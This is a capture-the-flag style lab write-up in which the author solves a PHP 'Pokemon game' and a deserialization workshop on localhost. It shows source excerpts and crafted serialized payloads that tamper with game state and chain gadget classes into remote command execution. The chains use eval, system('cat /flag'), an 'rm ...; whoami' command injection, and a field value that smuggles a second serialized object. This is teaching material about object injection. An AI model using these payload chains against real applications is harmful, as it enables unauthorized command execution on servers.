[Part 1: Pokemon Game]

[*] Target: http://localhost:15001

[Map 1: Fight random wild Pokemons]

    - At this level, I will show you how things work! I know that you are fighting with pikachus and this might be a good example

    - Since you can beat all of them! and you know the reason why? Yes! because of game_config.php

            class GlobalConfig {
                const BASE_DMG_MIN = 20;
                const BASE_DMG_MAX = 50;
                const BASE_HEALTH_MIN = 150;
                const BASE_HEALTH_MAX = 200;
                const DMG_INCREASE = 5;
                const HEALTH_INCREASE = 20;     
                const RUN_CHANCE = 30;
            }

    - And this is the pikachus 's source code in map1.php

            ...
            if ($action == "new_battle") {
            $health = rand(20, 40);
            $damage = rand(10, 15);
            $wild_pokemon = new Pokemon($health, $damage);
            $_SESSION["enemy"] = $wild_pokemon;
            echo json_encode([$_SESSION["trainer"]->pokemon, $wild_pokemon]);
            die();
            }
            ...

    - Know that the Pokemon class in pokemon.php is used for both, however, this is your Pokemon, just look at the trainer.php

            include_once("game_config.php");

            class Trainer
            {
                public $name;
                public $pokemon;
                public function __construct($name, $pokemon_name, $pokemon_type)
                {
                    $this->name = $name;
                    $health = rand(GlobalConfig::BASE_HEALTH_MIN, GlobalConfig::BASE_HEALTH_MAX);
                    $damage = rand(GlobalConfig::BASE_DMG_MIN, GlobalConfig::BASE_DMG_MAX);
                    $this->pokemon = new Pokemon($health, $damage, $pokemon_name, $pokemon_type);
                }
            ...
            }

    => You know how strong you are and the reason for that, and now we gonna focus on the main things, we need to look at the "Save Game" function

            ...
            if ($_GET["action"] == "save") {
                if (!isset($_SESSION["trainer"]))
                    die('{"msg": "You haven't started the game yet"}');
                        
                $message = serialize($_SESSION["trainer"]);
                header('Content-Type: application/octet-stream');
                header("Content-disposition: attachment; filename=pokemon.sav");
                header("Content-Length: " . strlen($message));
                echo $message;
            }
            ...

    => These code can be used to save serialized data from $_SESSION["trainer"] into a file named pokemon.sav which look like this 

            O:7:"Trainer":2:{s:4:"name";s:5:"admin";s:7:"pokemon";O:7:"Pokemon":4:{s:4:"name";s:8:"big blue";s:4:"type";s:8:"squirtle";s:6:"health";i:164;s:6:"damage";i:33;}}

        And $_SESSION["trainer"] = new Trainer($_SESSION["username"], $_POST["pokemon_name"], $_POST["pokemon_type"]); (Just look at the start.php)

        Just like that, we serialized all kinds of elements in the Trainer class including 

            [+] O:7:"Trainer":2:{...} => Object with 7-character name that includes 2 elements (s:4:"name" and s:7:"pokemon")

            [+] Pokemon object inside the Trainer which has Pokemon's name, health, type, and damage

    => And the final thing is the "Load Game" function

            ...
            else if ($_GET["action"] == "load") {
                if (isset($_FILES["data"])) {
                    $data = file_get_contents($_FILES["data"]["tmp_name"]);
                    $trainer = @unserialize($data);
        [?] You are right! we need to upload the pokemon.sav to these code deserialize stuff
                    if ($trainer == null) {
                        echo "Something went wrong";
                    }
                    else {
                        $_SESSION["trainer"] = $trainer;
                        echo "Load successfully";
                    }
                }
                else {
                    echo "Empty data";
                }
            }
            ...

    => Nothing here! you just need to talk with the farmer guy to go to the next map (He said that I need to defeat all the Pokemons)

[Map 2: Fight The Big Red Dragon Boss]

    - Holy moly, he is freaking strong with massive health and damage

    [!] Of course (just read the map2.php)

        ...
        else if ($action == "boss") {
            $health = rand(5000, 10000);
            $damage = rand(100, 300);
            $wild_pokemon = new Pokemon($health, $damage);
            $_SESSION["enemy"] = $wild_pokemon;
            echo json_encode([$_SESSION["trainer"]->pokemon, $wild_pokemon]);
            die();
        } 
        ...
    
    - Remember this is a deserialization-attack game! we gonna do it in the hacker way. Now save the game and fix things

        O:7:"Trainer":2:{s:4:"name";s:5:"admin";s:7:"pokemon";O:7:"Pokemon":4:{...s:6:"health";i:10000;s:6:"damage";i:10000;}}

    => Load this fixed file and we have a super strong Squirtle that can one-hit the boss

    [Final Result: Defeat the boss] You win!!! Here is your flag: CBJS{FAKE_FLAG_FAKE_FLAG}

[Map 3: Fight The Rayquaza Boss]

    - As you can see this boss has a special effect that can turn your health and damage to 1, you can see things clearly in map3.php

        ...
        else if ($action == "boss") {
            $health = rand(5000, 10000);
            $damage = rand(100, 300);
            $wild_pokemon = new Pokemon($health, $damage);
            $_SESSION["boss"] = $wild_pokemon;
            $_SESSION["trainer"]->pokemon->health = 1;
            $_SESSION["trainer"]->pokemon->damage = 1;
            echo json_encode([$_SESSION["trainer"]->pokemon, $wild_pokemon]);
            die();
        } 
        ...

    => So now! our trick in the previous map is useless, and we need a class that still can fight and has stuff like the Trainer class

    - Luckily the developer of this game gave us TrumCuoi class which is extended from the Trainer Class with a little bit of change in fight() function

        ...
        class TrumCuoi extends Trainer
        {
            public function fight(Pokemon $wild_pokemon)
            {
                return Array(Array(1, 0)); // [?] return an array contains 1 and 0
            }
        }    

    - This is fight() function in Trainer class

        ...
        public function fight(Pokemon $wild_pokemon)
        {
            $result = array();
            // Đánh nhau cho đến khi 1 trong 2 Pokemon hết máu
            while ($this->pokemon->health > 0 && $wild_pokemon->health > 0) {
                $this->pokemon->health = $this->pokemon->health - $wild_pokemon->damage;
                $wild_pokemon->health = $wild_pokemon->health - $this->pokemon->damage;
                array_push($result, array($this->pokemon->health, $wild_pokemon->health)); // [?] return an array contain current health and damage
            }
            $this->pokemon->levelUp();
            return $result;
        }
        ...

    => Yes! the effect of TrumCuoi can turn any wild Pokemon's health to 1 and its damage becomes 0, which means we can do this 

        O:8:"TrumCuoi":2:{s:4:"name";s:5:"admin";s:7:"pokemon";O:7:"Pokemon":4:{...s:6:"health";i:10000;s:6:"damage";i:10000;}}

    => Load this fixed file and we have a super strong immortal Squirtle which can one-hit any Pokemon

    [Final Result: Defeat the boss] You win!!! Here is your flag: CBJS{FAKE_FLAG_FAKE_FLAG}

[Map 4: Give the secret from the server to the girl]

    - In this case, I think we need to RCE to get the secret, to do so you need to focus on anything that can execute stuff in the code

    - I myself choose this class in utils.php

        ...
        class Calculator {
            public $expression;
            public function __construct($expr) {
                $this->expression = $expr;
            }

            public function run() {
                $result = eval($this->expression); // [?] eval() can execute PHP stuff
                return $result;
            }
        }
        ...

    - Combine with this, we may able to RCE and even print out the result

        ...
        else if ($action == "run") {
            $result = $_SESSION["trainer"]->run();
            if ($result == true)
                echo "You escaped";
            else
                echo "You failed to escape, and lost a little HP";
            die();
        }
        ...

    => O:10:"Calculator":1:{s:10:"expression";s:20:"system("cat /flag");";} 

    - Of course things gonna not the same since you loaded this fixed sav file (no Pokemon is shown because you gave up on Trainer class)

    => Now find a random Pokemon and run away from a fight, you can see this

    => CBJS{FAKE_FLAG_FAKE_FLAG} You failed to escape and lost a little HP 

    // [?] The flag is printed out by the power of system() function, of course

    // [?] Wander why I know where the secret is stored, feel free to read check_secret.php

    [Final Result: Have the secret flag] Give it to the girl and you will be redirected to map5.html

[Map 5: Trying to RCE this]

    - So the farmer guy tells you      "You do not have any action in this level"
                                       "Please quit and don't try to hack this game"
                                       "And I don't think you can"

    - This makes sense since it took me days to figure out a way to solve

    - I know what ya thinking "There's even no backend code for this map, how can you exploit stuff"

    - Okay, so the only thing that shows information to us is when we load sav file right? that's where I gonna perform the magic trick

    - Now! Focus on the Logger class in utils.php
    
        ...
        class Logger {
            public $filepath;
            public function __construct($filepath) {
                $this->filepath = $filepath;    
            }

            public function log($data) {
                $file = fopen($this->filepath, "w");
                fwrite($file, $data);
                fclose($file);
            }

            public function close() {
                system("rm " . $this->filepath);
            }
        }
        ...

    - And when we combine with this (line 40th to 42th in database.php), we can activate the close() function in the Logger

        public function __destruct() {
        $this->conn->close();
    }

    // [?] When the script finishes executing or when the $db object goes out of scope 
           the __destruct function of the Database class will be called, and it will close the database connection.

    - The logic is this, we use the construct method in both classes to pass our payload to $conn variable

    - I create a PHP file that contains both classes and fix them to create an available serialized chain

        class Logger {
            public $filepath;
            public function __construct($filepath) {
                $this->filepath = $filepath;    
            }
            ...
            public function close() {
            system("rm " . $this->filepath);
            }
        }

        class Database {
            public $conn;
            public function __construct($conn) {
                $this->conn = $conn;
            }
            ...
            public function __destruct() {
            $this->conn->close();
            }
        ...
        }

        $path = new Logger("not_created_file.hack; whoami"); // [?] => rm not_created_file.hack; whoami

        $connection = new Database($path);

        echo serialize($connection);

    // [?] You know these classes link together through serialize, like Database using close() function that created from Logger class

    => O:8:"Database":1:{s:4:"conn";O:6:"Logger":1:{s:8:"filepath";s:29:"not_created_file.hack; whoami";}}

    [Final Result: RCE] Load successfully www-data


--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------


[Part 2: PHP Deserialization Workshop]

[Level 1]

[*] Target: http://localhost:25001

    - If you are looking at this lab's source code and thinking "What the hack is this?", it is just a composer

    - A composer is a dependency manager for PHP, and a composer.json file is used to define the dependencies 
      just like a docker file which can be used to install things that are necessary for the PHP project and the downloaded stuff will be put to /vendor 

    => Because of that, we don't need to care about /vendor yet

    - So you already farmilier with __construct & __destruct, this time we gonna focus on __toString()

    // [?] You may know that __toString() is activated when the object is proccessed as a string

    - As you can see in the router.php, we have

            ...
            public function __toString()
            {
                return system("ping " . $this->host);
            }
            ...
    
    - And in the /templates/table.php

        <?php 
            foreach ($_SESSION["students"] as $idx => $student)
                // Duyệt qua từng học sinh và in thông tin ra màn hình
                echo <<<EOF
                    <tr>
                        <th scope="row">{$idx}</th>{$student}
                    </tr>
                EOF;
        ?>

    => With the condition satisfied, we can execute __toString() in Router, just like the way we did in map 4 of the Pokemon game

        O:6:"Router":1:{s:4:"host";s:4:"; id";}

    - However if you just load that without some adjustments, it just prints out your payload like an ID cause

        case 'load':
            $data = file_get_contents($_FILES["data"]["tmp_name"]);
            $students_data = explode("|", $data);
            $students = array();
            for ($idx = 0; $idx < count($students_data); $idx = $idx + 2) {
                $key = $students_data[$idx];
                $value = $students_data[$idx + 1];
                $value = unserialize($value);
                $students[$key] = $value;
                $_SESSION["students"] = $students;
            }

        => Basically, {$idx} separate with {$student} by '|', and if you don't do that, the code will think our payload is {$idx} and __toString() can't be activated

    => 0|O:6:"Router":1:{s:4:"host";s:4:"; id";}

    [Final Result: RCE] uid=33(www-data) gid=33(www-data) groups=33(www-data)

[Level 2]

[*] Target: http://localhost:25002

    - In the index.php of this lab, we can see this

        foreach (glob("libs/*.php") as $filename) {
            // Không include file router.php
            if ($filename !== "libs/router.php")
                include($filename);
        }

    => So, even though router.php existed, we were still not able to use the trick in the previous lab

    - And look at what I found in the student.php

            class Student
            {
                public $name;
                public $age;
                public $exam;
                public function __construct($name, $age)
                {
                    $this->name = $name;
                    $this->age = $age;
                }
                    public function __toString()
                {
                    return "<td>{$this->name}</td><td>{$this->age}</td><td>{$this->get_point()}</td>"; // [?] This stuff will be printed out in the $student 
                }
                ...
                public function get_point()
                {
                    if (isset($this->exam))
                        return $this->exam->get_result();
                    return "N/A";
                }
            }

    => It's normal, right? But it's just normal when you haven't looked at Calculator class in utils.php

            class Calculator
            {
                public $expression;
                public function __construct($expr)
                {
                    $this->expression = $expr;
                }

                public function get_result()
                {
                    $result = eval($this->expression);
                    return $result;
                }
            }
    
    => So we can redirect get_result() function from Student to Calculator

    - And this is the serialized stuff when we download the sav file 

        0|O:7:"Student":3:{s:4:"name";s:15:"Hung Thinh Tran";s:3:"age";s:2:"20";s:4:"exam";N;}|
        1|O:7:"Student":3:{s:4:"name";s:12:"Shadow Boxer";s:3:"age";s:3:"121";s:4:"exam";N;}|

    // [?] N stands for null, and the exam in this case also needs a lot of other stuff since this is a hidden class which even not included in index.php

    - Now, we need to fix things to pass the value to the exam

            <?php

            class Calculator
            {
                public $expression;
                public function __construct($expr)
                {
                    $this->expression = $expr;
                }

                public function get_result()
                {
                    $result = eval($this->expression);
                    return $result;
                }
            }

            class Exam
            {
                public $questions;
                public $right_answer;
                public $student_answer;

                public function __construct($questions, $right_answer)
                {
                    $this->questions = $questions;
                    $this->right_answer = $right_answer;
                }
                ...
                public function get_point()
                {
                    $result = 0;
                    for ($idx = 0; $idx < count($this->questions); $idx++) {
                        if ($this->student_answer[$idx] === $this->right_answer[$idx])
                            $result = $result + 1;
                    }
                    return $result;
                }
            }

            class Student
            {

                public $name;
                public $age;
                public $exam;
                public function __construct($name, $age, $exam)
                {
                    $this->name = $name;
                    $this->age = $age;
                    $this->exam = $exam;
                }

                public function __toString()
                {
                    return "<td>{$this->name}</td><td>{$this->age}</td><td>{$this->get_point()}</td>";
                }
                ...
                public function get_point()
                {
                    if (isset($this->exam))
                        return $this->exam->get_result();
                    return "N/A";
                }
            }

            $step1 = new Calculator("system('whoami');");
            $step2 = new Student("name","age",$step1);
            $payload = serialize($step2);
            echo $payload;

    => O:7:"Student":3:{s:4:"name";s:4:"name";s:3:"age";s:3:"age";s:4:"exam";O:10:"Calculator":1:{s:10:"expression";s:17:"system('whoami');";}}

    => Now the exam is set, which is the necessary condition to activate get_point() in the Student class

    - Fix the payload a little bit because it still uses explode() like the way it did in the previous lab

    => 0|O:7:"Student":3:{s:4:"name";s:4:"name";s:3:"age";s:3:"age";s:4:"exam";O:10:"Calculator":1:{s:10:"expression";s:17:"system('whoami');";}}|

    [Final Result: RCE] www-data

[Level 3]

[*] Target: http://localhost:25003

    - This lab is kinda different from the others since there is no place for you to neither download sav files nor upload your payload

    - Look at the safe-save-load.php

            ...

            foreach ($_SESSION["students"] as $key => $student)
                $message = $message . $key . "|" . serialize($student) . "|";
            file_put_contents("/usr/save_files/" . session_id(), $message);
            echo "Saved";

            ...

            $data = file_get_contents("/usr/save_files/" . session_id());
            $students_data = explode("|", $data);
            $students = array();
            for ($idx = 0; $idx < count($students_data); $idx = $idx + 2) {
                $key = $students_data[$idx];
                $value = $students_data[$idx + 1];
                $value = unserialize($value);
                $students[$key] = $value;
                $_SESSION["students"] = $students;
            }
            echo "Loaded";

            ... 
    
    - Now this lab saves the data stuff in /usr/save_files/{your session id} and also they load stuff from that

    - For example, when I saved my stuff

            #	Name	            Age	    Point
            0	Hung Thinh Tran	    20	    N/A
            1	Shadow Boxer	    20	    N/A 
    
        => root@321b988a5bc5:/usr/save_files# cat 4ad217c2c80114e73a352af2bc7798a1

            0|O:7:"Student":3:{s:4:"name";s:15:"Hung Thinh Tran";s:3:"age";s:2:"20";s:4:"exam";N;}|
            1|O:7:"Student":3:{s:4:"name";s:12:"Shadow Boxer";s:3:"age";s:2:"20";s:4:"exam";N;}|

    - Use the logic of an HTML hacker, I can do this 

        1|O:7:"Student":3:{s:4:"name";s:12:"Shadow Boxer";s:3:"age";s:2:"20";s:4:"exam";N;}|{index}|{my payload}|";s:2:"20";s:4:"exam";N;}|

    => This means that the next student you insert into your workshop will look like

        name: Emotional Damage
        age: 20";s:4:"exam";N;}|3|O:7:"Student":3:{s:4:"name";s:4:"name";s:3:"age";s:3:"age";s:4:"exam";O:10:"Calculator":1:{s:10:"expression";s:17:"system('whoami');";}}|

    // [?] I can use the payload from the previous lab because the only thing changed is the save and load file

        => root@321b988a5bc5:/usr/save_files# cat 4ad217c2c80114e73a352af2bc7798a1

        0|O:7:"Student":3:{s:4:"name";s:15:"Hung Thinh Tran";s:3:"age";s:2:"20";s:4:"exam";N;}|
        1|O:7:"Student":3:{s:4:"name";s:12:"Shadow Boxer";s:3:"age";s:2:"20";s:4:"exam";N;}|
        |b:0;|2|O:7:"Student":3:{s:4:"name";s:16:"Emotional Damage";s:3:"age";s:158:"20";s:4:"exam";N;}|
        3|O:7:"Student":3:{s:4:"name";s:4:"name";s:3:"age";s:3:"age";s:4:"exam";O:10:"Calculator":1:{s:10:"expression";s:17:"system('whoami');";}}|";s:4:"exam";N;}|

    => After entering the age for Emotional Damage, you press "Load Student" to unserialize the value

    [Final Result: RCE] www-data